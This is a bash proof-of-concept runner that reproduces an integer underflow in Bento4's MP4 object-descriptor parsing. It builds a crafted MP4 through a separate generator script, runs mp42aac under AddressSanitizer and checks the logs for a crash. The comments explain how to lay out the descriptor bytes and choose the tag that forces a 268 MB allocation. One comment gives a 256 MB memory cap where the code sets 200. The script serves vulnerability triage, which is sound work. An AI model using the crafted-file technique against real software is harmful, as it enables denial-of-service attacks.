#!/usr/bin/env bash
# PoC runner for VULN-003: AP4_ObjectDescriptor integer underflow → ~4GB SubStream
#
# Vulnerability: Ap4ObjectDescriptor.cpp (stream-reading constructor)
#   payload_size(2) - bytes_consumed(4) wraps unsigned to 0xFFFFFFFE (~4 GB)
#   The resulting SubStream immediately reads crafted attack bytes that decode
#   to a 268 MB descriptor (expandable encoding: 0xFF 0xFF 0xFF 0x7F).
#   AP4_UnknownDescriptor calls new AP4_Byte[0x0FFFFFFF].
#
# Crash strategy:
#   ASAN mmap_limit_mb=200 caps total non-shadow mmap at 200 MB.
#   The 268 MB allocation (268 > 200) exceeds the cap on the very first
#   call, so ASAN aborts with a CHECK failure regardless of how much RAM
#   the host machine has.
#
# Note: the attack nested-descriptor tag must be 0x07 (or any value NOT in
#   the handled set {0x01,0x02,0x03,0x04,0x05,0x06,0x0A,0x0B,0x0E,0x0F,0x10,0x11}).
#   Tag 0x0F = AP4_DESCRIPTOR_TAG_ES_ID_REF reads only 2 bytes and bypasses
#   the large allocation.  Tag 0x07 hits the default case → AP4_UnknownDescriptor
#   → new AP4_Byte[268435455] → mmap(268 MB) → ASAN limit exceeded → SIGABRT.

set -euo pipefail

POC_DIR="/data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4Expandable_h"
MP4="$POC_DIR/vuln_003.mp4"
RESULT="$POC_DIR/vuln_003_result.txt"
ASAN_LOG_PREFIX="$POC_DIR/asan.log"
BINARY="/data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac"

echo "=== VULN-003 PoC: AP4_ObjectDescriptor integer underflow ===" | tee "$RESULT"
echo "Date: $(date)" | tee -a "$RESULT"
echo "" | tee -a "$RESULT"

# Step 1: Generate the malicious MP4
echo "[*] Generating vuln_003.mp4 ..." | tee -a "$RESULT"
python3 "$POC_DIR/vuln_003_gen.py" | tee -a "$RESULT"
echo "" | tee -a "$RESULT"

# Step 2: Run mp42aac with ASAN.
#
#   mmap_limit_mb=256 forces ASAN to abort when total non-shadow mmap would
#   exceed 256 MB.  Since the crafted descriptor requests 268 MB (> 256 MB
#   by itself), the limit is hit immediately and the process is aborted.
#   abort_on_error=0 lets ASAN write its log before the process exits.
echo "[*] Running mp42aac (ASAN mmap_limit_mb=200 to force allocation failure) ..." \
    | tee -a "$RESULT"
ASAN_OPTIONS="abort_on_error=0:log_path=${ASAN_LOG_PREFIX}:mmap_limit_mb=200" \
    "$BINARY" "$MP4" /dev/null \
    >> "$RESULT" 2>&1 || true
echo "" | tee -a "$RESULT"

# Step 3: Collect ASAN output from the most-recent log file
echo "[*] ASAN log output:" | tee -a "$RESULT"
found_log=0
for log in $(ls -t "${ASAN_LOG_PREFIX}".* 2>/dev/null); do
    if [ -f "$log" ]; then
        echo "--- $log ---" | tee -a "$RESULT"
        cat "$log" | tee -a "$RESULT"
        found_log=1
        break
    fi
done
if [ "$found_log" -eq 0 ]; then
    echo "(no asan.log.* files found)" | tee -a "$RESULT"
fi
echo "" | tee -a "$RESULT"

# Step 4: Summary
echo "[*] Result summary:" | tee -a "$RESULT"
crash_found=0
for log in $(ls -t "${ASAN_LOG_PREFIX}".* 2>/dev/null); do
    if [ -f "$log" ]; then
        if grep -qE "AddressSanitizer|ABORTING|allocation-size-too-big|out-of-memory|mmap_limit_mb|total_mmaped|terminate called|SIGABRT|heap-buffer-overflow|stack-buffer-overflow" "$log" 2>/dev/null; then
            crash_found=1
        fi
        break
    fi
done
if [ "$crash_found" -eq 1 ]; then
    echo "  => CRASH / ASAN ERROR DETECTED (see asan.log above)" | tee -a "$RESULT"
else
    echo "  => No ASAN crash signal found in logs (check manually)" | tee -a "$RESULT"
fi

echo ""
echo "[+] Done. See: $RESULT"
